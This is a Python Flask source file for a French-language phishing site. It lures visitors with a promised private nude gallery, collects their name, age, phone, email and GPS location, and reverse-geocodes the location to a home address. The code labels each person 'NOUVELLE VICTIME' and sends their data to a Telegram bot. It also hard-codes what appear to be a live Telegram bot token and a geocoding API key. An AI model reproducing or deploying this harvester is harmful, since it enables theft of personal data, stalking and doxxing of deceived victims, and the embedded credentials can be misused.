from flask import Flask, request, render_template_string, redirect, url_for
import datetime
import requests
import threading

app = Flask(__name__)
LOG_FILE = "logs.txt"

TELEGRAM_TOKEN = "8224979725:AAE-CrPxf_jjLotta0cq1j4hFf0jsDUCXss"
TELEGRAM_CHAT_ID = "7301609294"
OPENCAGE_KEY = "ba18fb5cd71a40deb4d74c4855961c71"

def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def log_data(ip, ua, nom, prenom, age, phone, email, lat, lon, adresse):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{datetime.datetime.now()} | IP: {ip} | UA: {ua} | Nom: {nom} | Prenom: {prenom} | Âge: {age} | Phone: {phone} | Email: {email} | GPS: {lat},{lon} | Adresse: {adresse}\n")
    
    msg = (f"<b>🔔 NOUVELLE VICTIME !</b>\n"
           f"<b>👤 Nom :</b> {nom}\n"
           f"<b>👤 Prénom :</b> {prenom}\n"
           f"<b>🎂 Âge :</b> {age}\n"
           f"<b>📱 Téléphone :</b> {phone}\n"
           f"<b>📧 Email :</b> {email}\n"
           f"<b>📍 GPS :</b> {lat},{lon}\n"
           f"<b>🏠 Adresse :</b> {adresse}\n"
           f"<b>🌐 IP :</b> {ip}\n"
           f"<b>📱 Appareil :</b> {ua[:80]}...")
    send_telegram(msg)

def get_address(lat, lon):
    if not lat or not lon:
        return "Non fournie"
    try:
        url = f"https://api.opencagedata.com/geocode/v1/json?q={lat}+{lon}&key={OPENCAGE_KEY}&language=fr"
        r = requests.get(url, timeout=10)
        data = r.json()
        if data.get('results'):
            return data['results'][0]['formatted']
        return "Adresse non trouvée"
    except:
        return "Erreur geocoding"

@app.route('/')
def index():
    return render_template_string('''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Galerie privée</title>
<script>
let nom = prompt("🔒 ÉTAPE 1/6 - Entrez votre NOM :");
if (nom === null) { window.location.href = '/nude'; }
let prenom = prompt("🔒 ÉTAPE 2/6 - Entrez votre PRÉNOM :");
if (prenom === null) { window.location.href = '/nude'; }
let age = prompt("🎂 ÉTAPE 3/6 - Entrez votre ÂGE :");
if (age === null) { window.location.href = '/nude'; }
let phone = prompt("📱 ÉTAPE 4/6 - Entrez votre NUMÉRO :");
if (phone === null) { window.location.href = '/nude'; }
let email = prompt("📧 ÉTAPE 5/6 - Entrez votre EMAIL :");
if (email === null) { window.location.href = '/nude'; }

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            window.location.href = '/capture?nom=' + encodeURIComponent(nom) + 
                                   '&prenom=' + encodeURIComponent(prenom) + 
                                   '&age=' + encodeURIComponent(age) + 
                                   '&phone=' + encodeURIComponent(phone) + 
                                   '&email=' + encodeURIComponent(email) + 
                                   '&lat=' + pos.coords.latitude + 
                                   '&lon=' + pos.coords.longitude;
        }, function() {
            window.location.href = '/capture?nom=' + encodeURIComponent(nom) + 
                                   '&prenom=' + encodeURIComponent(prenom) + 
                                   '&age=' + encodeURIComponent(age) + 
                                   '&phone=' + encodeURIComponent(phone) + 
                                   '&email=' + encodeURIComponent(email) + 
                                   '&lat=&lon=';
        });
    } else {
        window.location.href = '/capture?nom=' + encodeURIComponent(nom) + 
                               '&prenom=' + encodeURIComponent(prenom) + 
                               '&age=' + encodeURIComponent(age) + 
                               '&phone=' + encodeURIComponent(phone) + 
                               '&email=' + encodeURIComponent(email) + 
                               '&lat=&lon=';
    }
}
getLocation();
</script>
</head>
<body style="background:#f5e6d3;text-align:center;padding-top:50px;font-family:Arial;">
<h1>⏳ Vérification en cours...</h1>
</body>
</html>
''')

@app.route('/capture')
def capture():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    nom = request.args.get('nom', '')
    prenom = request.args.get('prenom', '')
    age = request.args.get('age', '')
    phone = request.args.get('phone', '')
    email = request.args.get('email', '')
    lat = request.args.get('lat', '')
    lon = request.args.get('lon', '')
    adresse = get_address(lat, lon)
    threading.Thread(target=log_data, args=(ip, ua, nom, prenom, age, phone, email, lat, lon, adresse)).start()
    return redirect(url_for('nude'))

@app.route('/nude')
def nude():
    return render_template_string('''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Contenu privé</title>
<style>
body{margin:0;height:100vh;background:#d4c5b2;display:flex;justify-content:center;align-items:center;font-family:Arial;}
.blur-box{width:80%;max-width:400px;height:500px;background:#cbb59d;border-radius:20px;box-shadow:0 10px 40px rgba(0,0,0,0.3);display:flex;flex-direction:column;justify-content:center;align-items:center;position:relative;overflow:hidden;}
.blur-box::before{content:'';position:absolute;top:-20px;left:-20px;right:-20px;bottom:-20px;background:radial-gradient(circle at center,#e8d5c4,#b8a086);filter:blur(30px);z-index:0;}
.blur-box .content{position:relative;z-index:1;text-align:center;padding:20px;}
.blur-box .lock-icon{font-size:80px;opacity:0.7;}
.blur-box h2{font-weight:300;letter-spacing:2px;color:#2d1e12;}
.blur-box .btn{margin-top:20px;padding:12px 40px;background:#2d1e12;color:#f0e0d0;border:none;border-radius:30px;font-size:16px;cursor:pointer;text-transform:uppercase;letter-spacing:2px;}
.blur-box .small{margin-top:15px;font-size:11px;opacity:0.5;}
</style>
</head>
<body>
<div class="blur-box"><div class="content">
<div class="lock-icon">🔒</div>
<h2>Contenu déverrouillé</h2>
<p>Cliquez ci-dessous pour afficher la galerie</p>
<a href="#" class="btn" onclick="alert('⚠️ Cette fonctionnalité est en maintenance. Revenez plus tard.');">▶ DÉBLOQUER</a>
<p class="small">Vérification terminée. Accès accordé.</p>
</div></div>
</body>
</html>
''')

@app.route('/logs')
def view_logs():
    try:
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            return f"<pre>{f.read()}</pre>"
    except:
        return "Aucun log pour l'instant."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
